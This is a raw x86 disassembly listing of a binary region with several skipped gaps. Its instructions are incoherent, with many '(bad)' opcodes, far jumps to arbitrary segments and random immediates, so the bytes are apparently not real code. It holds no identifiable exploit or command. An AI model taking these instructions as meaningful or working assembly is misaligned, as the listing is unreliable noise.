  428ca8:	pop    ebp
  428ca9:	push   edx
  428caa:	pop    ebp
  428cab:	popa   
  428cac:	loope  0x428c59
  428cae:	rcr    DWORD PTR [edi+0x1a],cl
  428cb1:	mov    ecx,0xb7229bc3
  428cb7:	sub    al,0x9d
  428cb9:	loop   0x428ce2
  428cbb:	(bad)  [ebx-0x10]
  428cbe:	dec    ebp
  428cbf:	sahf   
  428cc0:	les    edi,FWORD PTR [ebx]
  428cc2:	jg     0x428c8e
  428cc4:	jae    0x428cd7
  428cc6:	fwait
  428cc7:	aas    
  428cc8:	xchg   edx,eax
  428cc9:	pop    edx
  428cca:	jg     0x428cee
  428ccc:	fcmovne st,st(6)
  428cce:	mov    bl,0xe5
  428cd0:	stc    
  428cd1:	test   DWORD PTR [ebx+edi*8-0x6345ecf0],eax
  428cd8:	xchg   BYTE PTR [edx+0x631d8de1],cl
  428cde:	retf   
  428cdf:	sbb    DWORD PTR [eax-0x76],0x35263b74
  428ce6:	cmp    eax,0xec8a389
  428ceb:	hlt    
  428cec:	pop    eax
  428ced:	cmp    ecx,ecx
  428cef:	mov    dl,0xe4
  428cf1:	and    al,BYTE PTR [ecx-0x6f991044]
  428cf7:	xchg   edi,eax
  428cf8:	hlt    
  428cf9:	cmp    BYTE PTR [ebx-0x722ae78d],0xfe
  428d00:	je     0x428cf3
  428d02:	lods   eax,DWORD PTR ds:[esi]
  428d03:	sahf   
  428d04:	fidiv  WORD PTR [edx+edi*2-0x69]
  428d08:	lea    edx,[ecx]
  428d0a:	call   0x2f2f:0xbc7e7883
  428d11:	or     ebx,DWORD PTR [ebx]
  428d13:	fadd   DWORD PTR [eax-0x3c94d54e]
  428d19:	aas    
  428d1a:	sub    edi,DWORD PTR [esi-0x2]
  428d1d:	imul   esp,edx,0xffffffd5
  428d20:	jb     0x428d26
  428d22:	sbb    eax,0x567f812
  428d27:	sahf   
  428d28:	sub    ecx,edi
  428d2a:	cmp    dl,BYTE PTR [ebp+ebx*1+0x54]
  428d2e:	mov    edi,0x83960596
  428d33:	sub    al,0xea
  428d35:	test   eax,0x463664d0
  428d3a:	mov    al,0xf4
  428d3c:	xlat   BYTE PTR ds:[ebx]
  428d3d:	retf   0x337e
  428d40:	out    dx,al
  428d41:	dec    edi
  428d42:	or     al,0x20
  428d44:	mov    ds:0xa7905a47,eax
  428d49:	dec    edi
  428d4a:	cld    
  428d4b:	ret    
  428d4c:	ins    DWORD PTR es:[edi],dx
  428d4d:	xor    BYTE PTR [edi+0x43a1f321],al
  428d53:	dec    edx
  428d54:	pushf  
  428d55:	mov    ebp,0x32b964eb
  428d5a:	(bad)  
  428d5b:	fcmovb st,st(7)
  428d5d:	pop    ss
  428d5e:	jp     0x428cf2
  428d60:	push   ds
  428d61:	sbb    eax,0x83f7201c
  428d66:	mov    ah,0x99
  428d68:	in     eax,dx
  428d69:	cmc    
  428d6a:	mov    al,0xe4
  428d6c:	out    dx,al
  428d6d:	call   0x428d72
	...
  428dd6:	xor    DWORD PTR [ebp+0x75f531f1],0xcc90b5c1
  428de0:	ins    BYTE PTR es:[edi],dx
  428de1:	retf   0x730c
  428de4:	leave  
  428de5:	popf   
  428de6:	addr16 mov dh,0x1
  428de9:	add    BYTE PTR [eax],al
  428deb:	add    DWORD PTR [eax],eax
  428ded:	add    BYTE PTR [ebx+0x7ab34da5],ah
  428df3:	sub    esp,DWORD PTR [ecx]
  428df5:	(bad)  
  428df6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428df7:	sbb    al,cl
  428df9:	aad    0x4
  428dfb:	daa    
  428dfc:	retf   0x388a
  428dff:	dec    ebx
  428e00:	sbb    eax,0x1be927bd
  428e05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428e06:	mov    eax,ds:0xfe9b3e3d
  428e0b:	adc    BYTE PTR [edx-0x4f0ab2f4],ah
  428e11:	mov    dl,BYTE PTR [eax+0x72]
  428e14:	daa    
  428e15:	dec    esi
  428e16:	push   edi
  428e17:	icebp  
  428e18:	ds stos DWORD PTR es:[edi],eax
  428e1a:	dec    ebp
  428e1b:	in     al,dx
  428e1c:	xchg   edi,eax
  428e1d:	jmp    0xc16b:0x96862ee8
  428e24:	iret   
  428e25:	lahf   
  428e26:	or     DWORD PTR [edi+0x270b0f1a],edi
  428e2c:	in     eax,dx
  428e2d:	shl    BYTE PTR [esi],cl
  428e2f:	mov    cl,0xdd
  428e31:	mov    eax,ds:0xc30d7eee
  428e36:	les    ebx,FWORD PTR [ebp-0x652cdc2f]
  428e3c:	push   ss
  428e3d:	mov    dl,0x4c
  428e3f:	dec    eax
  428e40:	std    
  428e41:	lahf   
  428e42:	(bad)  
  428e43:	aam    0x3c
  428e45:	repnz (bad) 
  428e47:	fwait
  428e48:	and    cl,al
  428e4a:	cmp    dl,ch
  428e4c:	adc    cl,BYTE PTR [eax]
  428e4e:	lds    esp,FWORD PTR [esi+0x78]
  428e51:	mov    ebx,0x7b7e43bb
  428e56:	repz or ecx,DWORD PTR [ecx]
  428e59:	(bad)  
  428e5a:	fs sbb bh,dl
  428e5d:	loopne 0x428e6d
  428e5f:	jno    0x428e0b
  428e61:	fwait
  428e62:	xor    ch,BYTE PTR [edx+0x37637633]
  428e68:	jnp    0x428e2c
  428e6a:	push   es
  428e6b:	push   eax
  428e6c:	xchg   ebp,eax
  428e6d:	ss xchg esi,eax
  428e6f:	jb     0x428eaf
  428e71:	adc    bl,BYTE PTR [edi+0x63baf812]
  428e77:	rcr    ebp,cl
  428e79:	push   edi
  428e7a:	jecxz  0x428e66
  428e7c:	mov    ch,0x15
  428e7e:	test   al,0x13
  428e80:	mov    cl,0xd4
  428e82:	sub    esp,DWORD PTR [edx-0x38]
  428e85:	push   cs
  428e86:	xor    DWORD PTR [eax-0x5b],esi
  428e89:	outs   dx,DWORD PTR ds:[esi]
  428e8a:	sbb    al,BYTE PTR [edx+edi*4]
  428e8d:	neg    BYTE PTR [ebp+0x4f]
  428e90:	jno    0x428e8e
  428e92:	and    eax,0xf1c1658d
  428e97:	fidiv  DWORD PTR [eax]
  428e99:	fbld   TBYTE PTR [bp+di]
  428e9c:	stc    
  428e9d:	jle    0x428e25
  428e9f:	test   DWORD PTR [ebp-0x3a5b7c5d],edx
  428ea5:	inc    ebx
  428ea6:	mov    bh,BYTE PTR ds:0x169f5bbc
  428eac:	jl     0x428eef
  428eae:	cmp    edx,DWORD PTR [edi+0x53a82552]
  428eb4:	arpl   WORD PTR [ebp+0x5fc3b9c],cx
  428eba:	sbb    al,0x16
  428ebc:	fsubr  DWORD PTR [ecx]
  428ebe:	clc    
  428ebf:	pop    ds
  428ec0:	jle    0x428e99
  428ec2:	test   al,0x8
  428ec4:	and    DWORD PTR [esi-0x2f],0xba44e346
  428ecb:	mov    ah,0xff
  428ecd:	xchg   edi,eax
  428ece:	enter  0x8ad5,0x92
  428ed2:	das    
  428ed3:	stos   DWORD PTR es:[edi],eax
  428ed4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428ed5:	adc    bl,BYTE PTR [ecx+0x5]
  428ed8:	leave  
  428ed9:	mov    ebp,0x84a3719a
  428ede:	pop    esp
  428edf:	cwde   
  428ee0:	lahf   
  428ee1:	and    DWORD PTR [edi-0x56],esi
  428ee4:	jns    0x428f11
  428ee6:	jle    0x428f20
  428ee8:	cmc    
  428ee9:	add    BYTE PTR [esi],ah
  428eeb:	into   
  428eec:	shl    BYTE PTR [eax+eax*1+0x0],0x0
	...
  428f55:	add    BYTE PTR [edi+0x5d],cl
  428f58:	pop    ecx
  428f59:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428f5d:	fstp   st(1)
  428f5f:	ror    DWORD PTR [esp+edx*4],0xa4
  428f63:	sti    
  428f64:	mov    fs,WORD PTR [edx+0x67]
  428f67:	mov    bh,0x1
  428f69:	add    BYTE PTR [eax],al
  428f6b:	add    DWORD PTR [eax],eax
  428f6d:	add    BYTE PTR [edx],bl
  428f6f:	fnstenv [esi+0x2a]
  428f72:	fwait
  428f73:	add    bh,ch
  428f75:	retf   0xdb21
  428f78:	mov    ch,0x8d
  428f7a:	mov    eax,0x3f33ce8b
  428f7f:	push   ds
  428f80:	jnp    0x428fca
  428f82:	sub    bl,BYTE PTR [ecx]
  428f84:	std    
  428f85:	out    dx,eax
  428f86:	push   0xffffffd6
  428f88:	lea    esi,[ebp+eax*1-0x78]
  428f8c:	psubsw mm2,QWORD PTR [ebx]
  428f8f:	pop    esi
  428f90:	lea    edx,[esp-0x77]
  428f94:	pop    ebp
  428f95:	iret   
  428f96:	aas    
  428f97:	enter  0xbce5,0x24
  428f9b:	or     eax,0x845da686
  428fa0:	std    
  428fa1:	mov    bl,dh
  428fa3:	fwait
  428fa4:	add    eax,0x84b81123
  428fa9:	ins    BYTE PTR es:[edi],dx
  428faa:	ds loope 0x428fbc
  428fad:	and    dh,ch
  428faf:	repz test BYTE PTR [ebp-0x1c],dh
  428fb3:	ror    BYTE PTR [esi-0x65fc8b95],1
  428fb9:	fld    QWORD PTR [ebp+0x1681bd73]
  428fbf:	push   ecx
  428fc0:	mov    ebp,0xfe58be92
  428fc5:	adc    eax,0x63832b4a
  428fca:	fistp  WORD PTR [ecx-0x510c8164]
  428fd0:	xor    BYTE PTR [esi-0x5e],bh
  428fd3:	jb     0x428fa5
  428fd5:	pusha  
  428fd6:	mov    dh,BYTE PTR [edi-0x3d]
  428fd9:	add    eax,0x422ac6d
  428fde:	jp     0x429011
  428fe0:	and    BYTE PTR [eax-0x56c4b443],bl
  428fe6:	sub    DWORD PTR [edi-0x5358171d],esi
  428fec:	jmp    0x76d20671
  428ff1:	cs imul ecx,esp,0x7ff94f04
  428ff8:	mov    bl,0xe9
  428ffa:	lods   eax,DWORD PTR ds:[esi]
  428ffb:	ret    0x9662
  428ffe:	adc    bl,ah
  429000:	ins    DWORD PTR es:[edi],dx
  429001:	mov    bl,0xc9
  429003:	and    al,0xc0
  429005:	repnz cmp BYTE PTR [esi-0x3f],0xcc
  42900a:	push   ebx
  42900b:	ds clc 
  42900d:	out    dx,eax
  42900e:	lods   eax,DWORD PTR ds:[esi]
  42900f:	push   esi
  429010:	jb     0x428f97
  429012:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429013:	in     al,0x33
  429015:	mov    edi,0x1ab29db2
  42901a:	popf   
  42901b:	mov    esp,0x8ea6d702
  429020:	adc    DWORD PTR [edi+0x2b0ecdd8],ebp
  429026:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429027:	lods   eax,DWORD PTR ds:[esi]
  429028:	call   0x6b24:0xb7095507
  42902f:	iret   
  429030:	ins    BYTE PTR es:[edi],dx
  429031:	scas   al,BYTE PTR es:[edi]
  429032:	add    BYTE PTR [edx+0x700f6108],0xd9
  429039:	xchg   ebp,eax
  42903a:	mov    al,0x46
  42903c:	adc    eax,edx
  42903e:	xor    BYTE PTR [esp+eax*2-0x3276fcd8],bl
  429045:	sbb    ecx,ebp
  429047:	add    eax,DWORD PTR [esi+0x4f84c53b]
  42904d:	loop   0x428ff0
  42904f:	mov    cl,0x98
  429051:	add    esp,esi
  429053:	or     ch,BYTE PTR [eax+0x77170fc6]
  429059:	or     ah,BYTE PTR [ebp-0x45]
  42905c:	jbe    0x429057
  42905e:	sti    
  42905f:	mov    edx,esp
  429061:	fwait
  429062:	(bad)  
  429063:	ds jo  0x429043
  429066:	ror    BYTE PTR [esi+edi*8+0x47f7e6d0],1
  42906d:	adc    BYTE PTR [eax],al
	...
  4290d3:	add    BYTE PTR [eax],al
  4290d5:	add    cl,ah
  4290d7:	in     al,dx
  4290d8:	mov    ebx,es
  4290da:	(bad)  
  4290db:	jecxz  0x4290cc
  4290dd:	out    dx,al
  4290de:	mov    edi,0x68fc7b77
  4290e3:	icebp  
  4290e4:	int    0x2
  4290e6:	addr16 mov eax,0x1000001
  4290ec:	add    BYTE PTR [eax],al
  4290ee:	(bad)
  4290f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4290f3:	shl    DWORD PTR [edx+0x72fd15d9],1
  4290f9:	(bad)  
  4290fa:	call   0x371e0fe0
  4290ff:	mov    eax,0xa4d4867
  429104:	fcmovb st,st(7)
  429106:	and    edi,DWORD PTR [esi+ebp*1]
  429109:	sbb    eax,DWORD PTR [ebx+0x146cdd1f]
  42910f:	inc    edx
  429110:	cmp    cl,dh
  429112:	add    al,0x6c
  429114:	es cmp DWORD PTR gs:[edx+0x13],ebx
  429119:	loop   0x4290f2
  42911b:	xchg   edi,eax
  42911c:	mov    ch,0x73
  42911e:	xchg   edx,eax
  42911f:	ror    bh,cl
  429121:	imul   ecx,DWORD PTR [ecx+0xf],0x58
  429125:	or     esi,esi
  429127:	pop    eax
  429128:	sub    ebp,0xef3afb6
  42912e:	cmp    DWORD PTR [ecx],esp
  429130:	loop   0x42916c
  429132:	sub    BYTE PTR [ecx+ebx*4-0x79],dl
  429136:	mov    eax,ds:0xcb18052a
  42913b:	test   al,0xea
  42913d:	cmp    DWORD PTR [eax+eiz*1],0xffffff91
  429141:	adc    eax,DWORD PTR [ecx+ecx*8]
  429144:	stc    
  429145:	pop    ss
  429146:	dec    ebx
  429148:	in     eax,0xdf
  42914a:	outs   dx,BYTE PTR ds:[esi]
  42914b:	inc    ebp
  42914c:	sub    DWORD PTR [ebp-0x76],esp
  42914f:	cdq    
  429150:	xor    al,0x24
  429152:	xor    DWORD PTR [esi-0x2e45eeb0],ecx
  429158:	pop    ebx
  429159:	dec    ebx
  42915a:	mov    edx,0x7d0e7d0e
  42915f:	fidivr WORD PTR [ecx+0x30]
  429162:	inc    DWORD PTR [edx]
  429164:	push   esp
  429165:	jb     0x4291c9
  429167:	fucomip st,st(7)
  429169:	mov    eax,0x925b1fda
  42916e:	fistp  WORD PTR [ebp+ecx*8-0x4e]
  429172:	call   0xc913:0xa8793e10
  429179:	pop    es
  42917a:	sahf   
  42917b:	sub    ebp,DWORD PTR [ebp-0x76a4bf40]
  429181:	pop    eax
  429182:	into   
  429183:	mov    dl,0xd8
  429185:	je     0x429125
  429187:	sti    
  429188:	sub    ch,dh
  42918a:	xor    eax,0xbdc90450
  42918f:	rcl    BYTE PTR [edi-0x41],cl
  429192:	(bad)  
  429193:	shl    esi,cl
  429195:	lods   eax,DWORD PTR cs:[esi]
  429197:	mov    dl,0x20
  429199:	ret    0xf417
  42919c:	es mov cl,0x8f
  42919f:	xchg   DWORD PTR [ebx+0xc],eax
  4291a2:	loope  0x42914f
  4291a4:	add    eax,0xebb21352
  4291a9:	frstor [ecx-0x6d]
  4291ac:	lea    edi,[edi+edi*4]
  4291af:	(bad)  
  4291b1:	fdivr  DWORD PTR [edi-0x3db15c34]
  4291b7:	iret   
  4291b8:	pop    ebx
  4291b9:	shl    BYTE PTR [eax+0xb],cl
  4291bc:	mov    dl,0xd6
  4291be:	(bad)  
  4291bf:	in     eax,dx
  4291c0:	inc    esi
  4291c1:	and    al,0xd8
  4291c3:	sub    eax,DWORD PTR [ebp+ebp*2+0x4a]
  4291c7:	or     ch,BYTE PTR [ecx+0x60]
  4291ca:	aas    
  4291cb:	pop    edx
  4291cc:	dec    ebp
  4291cd:	dec    edx
  4291ce:	pop    es
  4291cf:	pop    ss
  4291d0:	jg     0x4291f5
  4291d2:	outs   dx,BYTE PTR ds:[esi]
  4291d3:	dec    ecx
  4291d4:	repz js 0x4291f7
  4291d7:	in     eax,0x18
  4291d9:	div    ah
  4291db:	ins    BYTE PTR es:[edi],dx
  4291dc:	xor    BYTE PTR [eax-0x5c],ah
  4291df:	cmc    
  4291e0:	jbe    0x429187
  4291e2:	cld    
  4291e3:	dec    eax
  4291e4:	xchg   esi,eax
  4291e5:	sub    al,0xff
  4291e7:	cmp    eax,0xdba51cbd
  4291ec:	ret    
  4291ed:	push   cs
	...
  429256:	push   esi
  429257:	xchg   ebp,edi
  429259:	test   ch,bh
  42925b:	(bad)  
  42925c:	jg     0x429235
  42925e:	into   
  42925f:	retf   
  429260:	or     DWORD PTR [ecx+esi*4+0x676ec310],0x1b9
  42926b:	add    DWORD PTR [eax],eax
  42926d:	add    BYTE PTR [edx+ebp*8-0x2b],cl
  429271:	xchg   ecx,eax
  429272:	aas    
  429273:	adc    BYTE PTR [edx],al
  429275:	mov    ch,0xfb
  429277:	sbb    dh,0x79
  42927a:	dec    ecx
  42927b:	jnp    0x4292ac
  42927d:	or     DWORD PTR fs:[ecx+0x14],ecx
  429281:	sbb    DWORD PTR [ecx-0x252813a6],ebx
  429287:	cli    
  429288:	cmp    al,0xac
  42928a:	gs das 
  42928c:	imul   BYTE PTR [ecx+0x3a]
  42928f:	jno    0x42930b
  429291:	mov    eax,ds:0x3948d916
  429296:	bound  ecx,QWORD PTR [ebx+0x3f]
  429299:	dec    ebx
  42929a:	repnz pop ebp
  42929c:	ds dec ebp
  42929e:	or     ch,cl
  4292a0:	push   eax
  4292a1:	sub    edi,eax
  4292a3:	int3   
  4292a4:	add    DWORD PTR [ecx-0x5fd10707],ecx
  4292aa:	xchg   dh,ah
  4292ac:	cmp    ah,bh
  4292ae:	sbb    edx,DWORD PTR [ebx]
  4292b0:	add    eax,0x5bf53b7a
  4292b5:	sbb    eax,ecx
  4292b7:	or     bh,ch
  4292b9:	pop    edx
  4292ba:	test   BYTE PTR [ecx],dl
  4292bc:	dec    esp
  4292bd:	data16 (bad) 
  4292bf:	lahf   
  4292c0:	jmp    0x42926e
  4292c2:	fwait
  4292c3:	icebp  
  4292c4:	add    BYTE PTR [edi],dl
  4292c6:	and    al,0x78
  4292c8:	nop
  4292c9:	dec    esi
  4292ca:	jae    0x42930d
  4292cc:	loop   0x429310
  4292ce:	into   
  4292cf:	mov    BYTE PTR es:[esi+eax*2+0xafe3277],cl
  4292d7:	xchg   DWORD PTR [ebx+0x6a],ecx
  4292da:	out    0x62,eax
  4292dc:	dec    edi
  4292dd:	cmp    eax,0x31ec73a7
  4292e2:	mov    edx,0x4fd1009c
  4292e7:	in     eax,dx
  4292e8:	push   eax
  4292e9:	out    dx,al
  4292ea:	and    al,0xc4
  4292ec:	repz xchg edi,eax
  4292ee:	dec    edx
  4292ef:	jl     0x42935e
  4292f1:	(bad)  
  4292f2:	repz xchg edx,eax
  4292f4:	stc    
  4292f5:	cwde   
  4292f6:	xchg   ecx,eax
  4292f7:	out    dx,eax
  4292f8:	arpl   WORD PTR [edi],bp
  4292fa:	sahf   
  4292fb:	pop    ebx
  4292fc:	rep stos BYTE PTR es:[edi],al
  4292fe:	aaa    
  4292ff:	scas   al,BYTE PTR es:[edi]
  429300:	mov    eax,ds:0xa12beb81
  429305:	xchg   edi,eax
  429306:	enter  0xadaf,0xe7
  42930a:	add    al,0xa
  42930c:	jmp    esi
  42930e:	add    DWORD PTR ds:0x75731f79,edi
  429314:	inc    ecx
  429315:	pop    edi
  429316:	xchg   esp,eax
  429317:	imul   edx,DWORD PTR [ecx+0x72],0x5d84fec9
  42931e:	cmp    DWORD PTR ds:0x2e72986b,edi
  429324:	xor    BYTE PTR [ecx+0x4d],0xab
  429328:	push   ss
  429329:	mov    esi,0xc98bcfec
  42932e:	outs   dx,DWORD PTR ds:[esi]
  42932f:	or     al,0x36
  429331:	ins    DWORD PTR es:[edi],dx
  429332:	ret    0xc9aa
  429335:	pop    ecx
  429336:	sahf   
  429337:	ror    BYTE PTR [esi],1
  429339:	or     bl,ah
  42933b:	inc    esp
  42933c:	test   BYTE PTR [ebx],dh
  42933e:	mov    edi,0x96459aba
  429344:	retf   
  429345:	arpl   WORD PTR [ecx],sp
  429347:	push   ss
  429348:	mov    bl,0x6d
  42934a:	mov    dh,0x6d
  42934c:	inc    esi
  42934d:	out    dx,eax
  42934e:	adc    BYTE PTR [edi+0x1db9fe3f],bl
  429354:	aad    0x5
  429356:	push   cs
  429357:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429358:	xchg   ebx,eax
  429359:	sbb    ebp,ebx
  42935b:	call   0x51d9:0xbef1d260
  429362:	mov    ebx,DWORD PTR [esi+0x35cf7c4e]
  429368:	(bad)  
  429369:	shl    BYTE PTR [edx+0x3a],0x6b
  42936d:	add    BYTE PTR [bx+si],al
	...
  4293d4:	add    BYTE PTR [eax],al
  4293d6:	lock adc al,0xe1
  4293d9:	(bad)  
  4293da:	in     eax,0xff
  4293dc:	call   FWORD PTR [esi]
  4293de:	jae    0x4293e5
  4293e0:	dec    edx
  4293e1:	mov    bh,0xfd
  4293e3:	push   ss
  4293e4:	push   eax
  4293e5:	or     esp,DWORD PTR [edi-0x46]
  4293e8:	add    DWORD PTR [eax],eax
  4293ea:	add    BYTE PTR [ecx],al
  4293ec:	add    BYTE PTR [eax],al
  4293ee:	out    0xf7,al
  4293f0:	mov    ds:0xf0453bde,al
  4293f5:	jp     0x429383
  4293f7:	cmc    
  4293f8:	dec    BYTE PTR fs:[bp+si-0x74]
  4293fd:	pop    edx
  4293fe:	mov    ebp,ebx
  429400:	sub    dl,BYTE PTR [eax-0x68727a90]
  429406:	sbb    bl,al
  429408:	xchg   ebx,eax
  429409:	cmc    
  42940a:	ret    
  42940b:	xchg   ecx,eax
  42940c:	nop
  42940d:	jo     0x429446
  42940f:	test   eax,0xf9bd16a0
  429414:	out    dx,eax
  429415:	mov    ds:0x4c9d16a9,eax
  42941a:	ficom  WORD PTR [edi+0x52f039a6]
  429420:	xor    DWORD PTR [ebx],0xc8ec2638
  429426:	pop    ecx
  429427:	xchg   DWORD PTR [edi+0x1fde89ea],ecx
  42942d:	sub    bl,BYTE PTR [edx]
  42942f:	xchg   edx,eax
  429430:	in     eax,dx
  429431:	popf   
  429432:	pop    ebp
  429433:	pop    es
  429434:	ret    
  429435:	xchg   BYTE PTR ds:0xd03fc050,ch
  42943b:	or     al,0x7d
  42943d:	sbb    al,0x1b
  42943f:	clc    
  429440:	sar    ecx,0xd2
  429443:	ret    
  429444:	add    dl,BYTE PTR [edi+0x3da7239a]
  42944a:	add    ebp,ebp
  42944c:	hlt    
  42944d:	test   eax,0x3fd9d577
  429452:	sub    al,0x5a
  429454:	add    BYTE PTR [eax+eax*8+0x5b],0x22
  429459:	mov    dl,0x6d
  42945b:	pop    es
  42945c:	(bad)  
  42945d:	fadd   QWORD PTR [esi-0x26]
  429460:	scas   al,BYTE PTR es:[edi]
  429461:	cmp    esi,eax
  429463:	imul   DWORD PTR ds:0xa332abc6
  429469:	cli    
  42946a:	outs   dx,BYTE PTR ds:[esi]
  42946b:	je     0x429412
  42946d:	jne    0x4294da
  42946f:	mov    ds:0x580e3ffc,al
  429474:	mov    ebx,0xeadeccd0
  429479:	add    ah,BYTE PTR [edx]
  42947b:	cmovne ebx,DWORD PTR [eax+ebp*2+0x3c0c7ceb]
  429483:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429484:	adc    esp,edx
  429486:	mov    ch,0x2
  429488:	lahf   
  429489:	es push edx
  42948b:	adc    BYTE PTR [eax],dl
  42948d:	mov    ss,ebx
  42948f:	and    ah,bl
  429491:	add    al,0xc5
  429493:	cmp    al,0x4b
  429495:	or     BYTE PTR [edx-0x190f8b08],bl
  42949b:	cs jae 0x4294ec
  42949e:	add    eax,0x39bcc418
  4294a3:	sub    DWORD PTR [edi-0x273fabfb],0xffffffe7
  4294aa:	lods   eax,DWORD PTR ds:[esi]
  4294ab:	sub    eax,0xa89f28c1
  4294b0:	xchg   ebx,eax
  4294b1:	xor    eax,0xb5ba6200
  4294b6:	outs   dx,BYTE PTR ds:[esi]
  4294b7:	xchg   BYTE PTR [ebp-0xc56d7db],bl
  4294bd:	dec    ecx
  4294be:	dec    ebp
  4294bf:	cli    
  4294c0:	cs sti 
  4294c2:	cs loopne 0x42944d
  4294c5:	mov    eax,0x7db8aca9
  4294ca:	jl     0x42953e
  4294cc:	sbb    dh,BYTE PTR [edi+0x79]
  4294cf:	mov    al,0x14
  4294d1:	jle    0x4294da
  4294d3:	push   ds
  4294d4:	jp     0x42947a
  4294d6:	fcomi  st,st(6)
  4294d8:	jge    0x429498
  4294da:	mov    eax,0xa45bf255
  4294df:	xchg   DWORD PTR [ecx],ebx
  4294e1:	in     eax,dx
  4294e2:	jmp    0xc0e4:0x5583763
  4294e9:	popf   
  4294ea:	mov    eax,0x522902
	...
  429553:	add    BYTE PTR [eax],al
  429555:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  429559:	sub    al,0x53
  42955b:	ds jg  0x4295cb
  42955e:	dec    esp
  42955f:	arpl   WORD PTR [ebp+0x7709d4ea],dx
  429565:	or     eax,0x1bb67
  42956a:	add    BYTE PTR [ecx],al
  42956c:	add    BYTE PTR [eax],al
  42956e:	push   ds
  42956f:	mov    bh,BYTE PTR [esi+0x42]
  429572:	test   eax,0xceffab3d
  429577:	call   0xc502427d
  42957c:	jmp    0x4295a0
  42957e:	pop    es
  42957f:	ror    esp,1
  429581:	mov    eax,0x27bffed0
  429586:	xchg   ebp,eax
  429587:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429588:	retf   
  429589:	cmp    bl,BYTE PTR [ecx+ebx*8]
  42958c:	push   edi
  42958d:	or     BYTE PTR [edx+0x66],cl
  429590:	sbb    al,0xf2
  429592:	sub    DWORD PTR ds:0x23899ebf,0x9cce71bf
  42959c:	sbb    al,0xc
  42959e:	test   DWORD PTR ds:0x49343ddc,eax
  4295a4:	cmp    DWORD PTR [edx-0x3993483c],edi
  4295aa:	sahf   
  4295ab:	xchg   esp,eax
  4295ac:	fbstp  TBYTE PTR [ebp-0x67]
  4295af:	std    
  4295b0:	fld    st(1)
  4295b2:	xor    esi,DWORD PTR [eax+0xd]
  4295b5:	dec    esp
  4295b6:	rol    DWORD PTR [ebx+0x19],1
  4295b9:	xchg   DWORD PTR cs:[ebp+0x34e57efe],ecx
  4295c0:	push   edx
  4295c1:	add    eax,0xffffffe6
  4295c4:	in     eax,dx
  4295c5:	pop    ss
  4295c6:	add    al,0x98
  4295c8:	int    0x16
  4295ca:	sub    BYTE PTR [ebp-0x3358b39c],cl
  4295d0:	xchg   ebp,eax
  4295d1:	mov    ch,0x5b
  4295d3:	retf   0x1878
  4295d6:	mov    ebp,0xdf56ac01
  4295db:	mov    edx,0xabe917c3
  4295e0:	xchg   ecx,eax
  4295e1:	mov    bl,0xf4
  4295e3:	fidiv  WORD PTR [eax+edx*4-0x64]
  4295e7:	cli    
  4295e8:	mov    dh,0xb5
  4295ea:	pop    ecx
  4295eb:	mov    bh,0x70
  4295ed:	outs   dx,BYTE PTR ds:[esi]
  4295ee:	xor    eax,0xa29438af
  4295f3:	xor    DWORD PTR [ecx],esp
  4295f5:	(bad)  
  4295f6:	push   cs
  4295f7:	in     eax,dx
  4295f8:	sbb    eax,0xa78d18e1
  4295fd:	and    BYTE PTR [ebp+0x7bd70e4b],bl
  429603:	dec    ebx
  429604:	jp     0x4295d1
  429606:	(bad)  
  429607:	cmp    BYTE PTR [eax+0x5dbdd030],ah
  42960d:	jl     0x429627
  42960f:	sbb    DWORD PTR [eax+0x7b],esp
  429612:	mov    ds:0x3ccffc1a,eax
  429617:	sahf   
  429618:	cld    
  429619:	add    BYTE PTR [edx+0x4803e682],bh
  42961f:	push   cs
  429620:	imul   eax,DWORD PTR [ecx-0x1a],0x456cf3e5
  429627:	sbb    DWORD PTR [ebp+0x32dafe98],edi
  42962d:	int3   
  42962e:	add    dh,BYTE PTR [esp+ecx*8]
  429631:	sub    eax,0xdfc599f4
  429636:	nop
  429637:	and    dh,bh
  429639:	jmp    0x429609
  42963b:	cmc    
  42963c:	sub    esp,edx
  42963e:	push   es
  42963f:	inc    ebp
  429640:	test   eax,0xeb3cc6d5
  429645:	mov    al,0x7f
  429647:	mov    ebp,0xf77dca05
  42964c:	xchg   esi,eax
  42964d:	fs dec ecx
  42964f:	shl    al,0x7c
  429652:	mov    bl,0x9b
  429654:	xlat   BYTE PTR ds:[ebx]
  429655:	mov    ebx,0xeb859c20
  42965a:	data16 xchg BYTE PTR [edx-0x5b],dh
  42965e:	daa    
  42965f:	mov    bl,0xd4
  429661:	inc    edi
  429662:	daa    
  429663:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429664:	test   al,0x17
  429666:	dec    ebp
  429667:	nop    DWORD PTR [ebx+eiz*2+0x56]
  42966c:	fwait
  42966d:	mov    edi,0x0
	...
  4296d6:	ins    DWORD PTR es:[edi],dx
  4296d7:	sbb    eax,0xfbf6c0e6
  4296dc:	outs   dx,DWORD PTR ds:[esi]
  4296dd:	mov    ebp,0xab7b5cea
  4296e2:	and    edx,edi
  4296e4:	jno    0x4296c3
  4296e6:	addr16 mov esp,0x1000001
  4296ec:	add    BYTE PTR [eax],al
  4296ee:	or     eax,DWORD PTR [eax+ebp*2+0x4dc59e34]
  4296f5:	in     eax,0x98
  4296f7:	inc    ebx
  4296f8:	xchg   ecx,eax
  4296f9:	sar    BYTE PTR [ecx+0x746b2f8b],1
  4296ff:	(bad)  [edx]
  429701:	push   ss
  429702:	mov    dl,BYTE PTR [esi+ebx*8+0x7e31cd36]
  429709:	js     0x429784
  42970b:	mov    dl,0x9e
  42970d:	and    al,0x6d
  42970f:	jmp    0x5a03cb22
  429714:	mov    ch,0xdf
  429716:	mov    edi,0xea3b6321
  42971b:	mov    esi,0x951829b8
  429720:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429721:	push   ss
  429722:	sbb    eax,DWORD PTR [ebx]
  429724:	stc    
  429725:	pop    es
  429726:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429727:	(bad)  
  429728:	retf   
  429729:	ds push 0xf93f8e64
  42972f:	repz cmp ah,BYTE PTR [ebp+0x1f]
  429733:	mov    esi,0x20104445
  429738:	inc    esp
